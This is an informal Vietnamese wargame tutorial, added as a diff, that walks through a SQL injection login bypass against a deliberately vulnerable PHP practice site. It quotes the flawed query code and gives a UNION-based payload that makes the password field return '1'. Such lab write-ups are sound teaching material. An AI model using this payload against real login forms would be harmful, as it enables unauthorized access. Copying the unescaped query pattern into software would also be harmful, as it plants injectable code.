@@ -1,0 +1,207 @@
+﻿<?manhluat
+############ FrI Team ############
+// -----------------------------//
+
+$My_Team = 'FrI Team';
+
+$Author = 'manhluat93';
+
+$at = array('HCEGROUP.NET','VNBRAIN.NET');
+
+
+
+// -----------------------------//
+############ FrI Team ############
+?>
+
+Okie ta bắt đầu TUT nhé :)
+
+Chuyện là ngày xửa ngày xưa , manhluat có thử check 1 site :) ... Site đó rất khác các site thường :) ..
+__Và sau gian nan manhluat exploit đc site đó thí wên hẵng nó :D
+_Bây giờ nhớ lại nên code lại 1 cái y chang cho bà con thực tập :)
+
+
+
+___WARGAME có 3 level (dự tính).
+_Từng level sẽ nâng độ khó lên :)
+_Mong bà con sẽ tham gia nhiều nhiều nhé ^^!
+
+---------------------------START------------------------------
+Bắt đầu thôi :)
+
+_Như a-e thấy ô user thì giới hạn 5 kí tự - password thì 8 kí ưự :)
+
+_Vậy ta bật FireBug lên sửa lại :)
+
+
+You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '''' LIMIT 0,1' at line 1
+Query Error: SELECT * FROM user WHERE username = ''' LIMIT 0,1
+
+ -----> Ô username bị lỗi 
+ Giờ ta check ô password :)
+ 
+ 
+ Failed! ... Password is Wrong
+ -----------> Ô password ko có lỗi :)
+ 
+ Ta soi code nhé :)
+ 
+ # gan cho $user = $_POST user va ko addslashes
+$user = $_POST['user']; 
+#gan cho $pass = $_POST pass va co' addslashes
+$pass = addslashes($_POST['pass']);
+
+-----> Đây là lí do $pass thì ko có lỗi mà $user lại có lỗi :) . Có thể đây là 1 cái sai của coder :D
+
+
+#cau query
+$sqlcheckuser = "SELECT * FROM user WHERE username = '".$user."' LIMIT 0,1";
+#query cau tren
+$checkuser = mysql_query($sqlcheckuser) or die (mysql_error().'<br>Query Error: '.$sqlcheckuser);
+---------------> Ta thấy ở đây 2 câu sql này kiểm tra trước xem có user đó ko ? ...Rồi mới lấy pass :)
+
+$userarray = mysql_fetch_array($checkuser); --->  Result
+
+
+
+
+
+$sqluserpass = "SELECT * FROM user WHERE username = '".$user."' AND password = '".$pass."' LIMIT 0,1";
+$query = mysql_query($sqluserpass)or die (mysql_error());
+
+----> câu query này lấy user và pass của username = $user và password = $pass :)
+
+
+
+Failed! ... Password is Wrong --> nếu ta đánh sai pass thì nó hiện lên ngay còn nếu như ta đánh sai user thì sao ?
+Username is Wrong --> sai username :)
+
+ 0kie vậy ta thử đánh đúng pass xem sao :D
+ 
+ Đc thấy chưa ? :D
+ 
+ ------Okei xong phần soi code :) Ta bắt đầu exploit :) ------
+ 
+ Trước tiên ta thấy ô user bị lỗi riồ đúng ko ?
+ 
+ "You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '''' LIMIT 0,1' at line 1
+Query Error: SELECT * FROM user WHERE username = ''' LIMIT 0,1"
+
+Nhìn câu query này :) : SELECT * FROM user WHERE username = ''' LIMIT 0,1 
+Thấy ko ? do ko addslashes nên kí tự ' nó cđưa vào query và bung ra lỗi :)
+Okie ta bắt đầu khai thác xem :)
+_
+
+The used SELECT statements have a different number of columns
+Query Error: SELECT * FROM user WHERE username = 'admin' union select 0#' LIMIT 0,1
+
+Quen thuộc rồi :) khỏi nói nhé :D
+
+
+Failed! ... Password is Wrong ---> Vậy là ta đoán trúng số col rồi :) 
+
+admin' union select username,1 from user# <-- Ta bắt đầu đưa col name vào 2 con số kia :) ...
+Nếu các bạn hay exploit trên URL (GET) thì có thể nó sẽ cho ra các con số trên màn hình rồi bỏ column name vào đó :)
+
+Nhưng đây là POST và ko echo gì cả nên không có :)
+_Vây suy nghĩ xem ta làm đc gì trong câu union này ???
+
+
+vẫn failed pass :) ... Way lại source :) 
+
+
+Array
+(
+    [0] => admin
+    [username] => admin
+    [1] => crackme
+    [password] => crackme
+)
+
+
+ta thấy đấy $array['username' = 'admin' còn $array['password'] = 'crackme' :) ... Giờ ta thử chút nhé )
+
+À nên nhớ giả sử ở đây ta ko hề biết password là 'crackme' nhé :)
+
+_À ... nhà kêu tí chuyện :) chờ tí nhé :)
+
+_Okei típ nhé :)
+
+
+Array ( [0] => admin [username] => admin [1] => crackme [password] => crackme )
+
+nó vẫn hiện ra cái này .... ko ổn gì cả :-? ...ta thử xíu nữa
+
+Array
+(
+    [0] => admin
+    [username] => admin
+    [1] => 1
+    [password] => 1
+)
+
+
+A có 1 chút manh mối ? ... các bạn thấy lạ ko ? ... password giờ lại biến thành con số 1 ? 
+Sao lạ thế .. xem lại câu query xem
+' union select username,1 from user#
+
+ghép với câu query
+
+SELECT * FROM user WHERE username = '' union select username,1 from user#' LIMIT 0,1
+Đây là câu query mà khi input đống này vào ?? thử fân tích xem
+select từ table user ở cái chỗ mà username = '' 
+
+'' <--- rỗng ... tức là lấy hết á :D ko chừa user nào cả vậy hóa ra câu username = '' thành vô nghĩa :) 
+
+union nối lại select username và 1 từ table user # <-- comment làm cho đoạn ' LIMIT 0,1 biến mất :D .. và ko có tác dụng
+
+Đấy ta thấy nó select username và con số 1 vì vậy password trở thành 1 ....
+
+Vậy thì sao .. suy nghĩ đc chưa nào ???? Ta chỉ cần đánh 1 vào password là vào đc 
+
+hahaha cúi cùng đã tìm ra :D
+
+
+Thành công hahaha :D
+
+______END TUT_______
+Chúc các bạn may mắn :D
+Nhớ tham gia level 2 và 3 nha :)
+
+Bổ sung thêm kiến thức SQL nào ^^!
+
+BB :x
+
+
+
+
+<?manhluat
+############ FrI Team ############
+// -----------------------------//
+
+$My_Team = 'FrI Team';
+
+$Author = 'manhluat93';
+
+$at = array('HCEGROUP.NET','VNBRAIN.NET');
+
+
+
+// -----------------------------//
+############ FrI Team ############
+?>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
